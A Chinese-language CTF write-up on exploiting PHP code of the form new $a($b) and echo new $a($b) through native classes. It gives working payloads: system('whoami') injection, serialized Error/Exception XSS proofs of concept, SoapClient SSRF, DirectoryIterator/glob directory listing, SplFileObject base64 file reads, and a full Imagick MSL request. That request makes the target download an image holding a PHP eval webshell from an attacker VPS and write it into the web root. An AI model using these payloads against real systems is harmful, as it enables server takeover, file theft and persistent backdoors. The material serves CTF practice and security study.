![](https://p0.ssl.qhimg.com/t018e2f2f2660a2f600.jpg)

## 前言

最近打了一个比赛遇到了以new $a($b)这样的考点,结合以前了解的知识,所以总结一下几种类似形式的解题技巧

这里主要以下三种形式的代码

 eval(“echo new $a($b);”)

 echo new $a($b)

 new $a($b)

## eval(“echo new $a($b);”)

首先来看第一种

这个形式的代码相对简单,我们只需要给a随便传⼀个原⽣类，给b传恶意命令即可：

```
?a=Exception&b=system('whoami')
?a=SplFileObject&b=system('whoami')
```

然后我们来看第二种,也是比赛中经常会遇到的

这里我们就需要来了解到php原生类的概念了

## 使用 Error/Exception 内置类进行 XSS

### Error 内置类

-   适用于php7版本
-   在开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()` 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 `echo <Object>` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString` 方法，这是一种挖洞的新思路。

下面演示如何使用 Error 内置类来构造 XSS。

测试代码：

```
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）

给出POC：

```
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>

//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

### Exception 内置类

-   适用于php5、7版本
-   开启报错的情况下

测试代码：

```
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

给出POC：

```
<?php
$a = new Exception("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>

//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

## 使用 Error/Exception 内置类绕过哈希比较

在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。

### Error 类

**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。

**类摘要：**

```
Error implements Throwable {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```

**类属性：**

-   message：错误消息内容
-   code：错误代码
-   file：抛出错误的文件名
-   line：抛出错误在该文件中的行数

**类方法：**

-   [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
-   [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
-   [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
-   [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
-   [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
-   [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
-   [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
-   [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
-   [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
-   [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error

### Exception 类

**Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。

**类摘要：**

```
Exception {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```

**类属性：**

-   message：异常消息内容
-   code：异常代码
-   file：抛出异常的文件名
-   line：抛出异常在该文件中的行号

**类方法：**

-   [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
-   [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
-   [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
-   [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
-   [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
-   [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
-   [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
-   [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
-   [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
-   [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆

我们可以看到，在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。

我们以Error为例，我们看看当触发他的 `__toString` 方法时会发生什么：

```
<?php
$a = new Error("payload",1);
echo $a;
```

输出如下：

```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 `Error("payload",1)` 中的错误代码“1”则没有输出出来。

在来看看下一个例子：

```
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```

输出如下：

```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 `__toString` 返回的数据包含当前行号。

Exception 类与 Error 的使用和结果完全一样，只不过 `Exception` 类适用于PHP 5和7，而 `Error` 只适用于 PHP 7。

## 使用 SoapClient 类进行 SSRF

### SoapClient 类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

类摘要如下：

```
SoapClient {
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = "" ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed
}
```

可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。

该类的构造函数如下：

```
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```

-   第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
-   第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

### 使用 SoapClient 类进行 SSRF

知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target\_url。

```
<?php
$a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。

## 使用 DirectoryIterator 类绕过 open\_basedir

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。

DirectoryIterator与glob://协议结合将无视open\_basedir对目录的限制，可以用来列举出指定目录下的文件。

测试代码：

```
// test.php
<?php
$dir = $_GET['whoami'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>

# payload一句话的形式:
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

我们输入 `/?whoami=glob:///*` 即可列出根目录下的文件,但是会发现只能列根目录和open\_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

## 使用 SimpleXMLElement 类进行 XXE

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

### SimpleXMLElement

通过设置第三个参数 data\_is\_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。

这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。

上述,我们继续来看这个demo

### echo new $a($b)

**遍历⽬录类**

 DirectoryIterator

 GlobIterator

 FilesystemIterator

**读取⽂件类**

 SplFileObject

来看案例,这边

```
<?php
highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
echo new $a($b);
```

针对这样的代码，读flag的操作步骤如下： ⾸先⽤能遍历⽬录的原⽣类，⽐如DirectoryIterator结合glob读⽂件名

```
?a=DirectoryIterator&b=glob://f*
```

由于DirectoryIterator返回结果是⼀个迭代器，所以通常直接⽤echo打印出来的是第⼀ 项，所以需要结合glob协议通配符的特性去⼀点点把flag⽂件名匹配出来

然后⽤SplFileObject去读⽂件

```
?a=SplFileObject&b=flag.php
```

因为SplFileObject只能读取一行内容,所以需要使⽤伪协议将其读出来

```
?a=SplFileObject&b=php://filter/convert.base64-encode/resource=flag.php
```

最后来看最难的这个点

## new $a($b)

这里没有了echo,本来就不能RCE了,现在去掉echo后又不能文件读取了

先来看代码

```
<?php
error_reporting(0);
show_source(__FILE__);
new $_GET['b']($_GET['c']);
?>
```

考察的是原⽣类，不过和以往常⻅的原⽣类题⽬不⼀样，不存在echo，经过测试之后存在

```
?b=Imagick&c=http://VPS
```

在VPS中⽣成⼀个图⽚，含有⼀句话⽊⻢

```
convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positiv
e.png
```

在VPS中监听12345端⼝，再往服务器发送请求包如下：

```
POST /?b=Imagick&c=vid:msl:/tmp/php* HTTP/1.1
Host: 1.1.1.1:32127
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/53
7.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmq
Tayg6bqr
Content-Length: 348
------WebKitFormBoundaryeTvfNEmqTayg6bqr
Content-Disposition: form-data; name="123"; filename="exec.msl"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://vps:12345/positive.png" />
<write filename="/var/www/html/positive.php"/>
</image>
------WebKitFormBoundaryeTvfNEmqTayg6bqr--
```

发送后，靶机就往VPS中请求了该⽂件，并且把该⽂件下载到了指定⽬录

可以发现这里的利用条件也是非常苛刻的

## 出题

通过以上知识点,我就想到可以由此来出个web题,这里我们会发现虽然new $a($b)不能RCE,但是还是可以成功触发原生类的特性的,那么就可以通过原生类绕过加密的特性来作为考点

这里我们来看这一题的源码

```
<?php
highlight_file(__FILE__);
$a = new $_GET['class1']($_GET['a']);$b = new $_GET['class2']($_GET['b']);
if ($a !== $b and md5($a)===md5($b))
{
    echo new $_GET['class3']($_GET['c']);
}
```

我们首先利用php原生类Error来绕过md5过滤

```
/index.php?a=1&b=2&class1=Error&class2=Error
```

然后通过SplFileObject类以base64的形式来读取文件

```
class3=SplFileObject&c=php://filter/convert.base64-encode/resource=flag.php
```

最后成功读取这个flag文件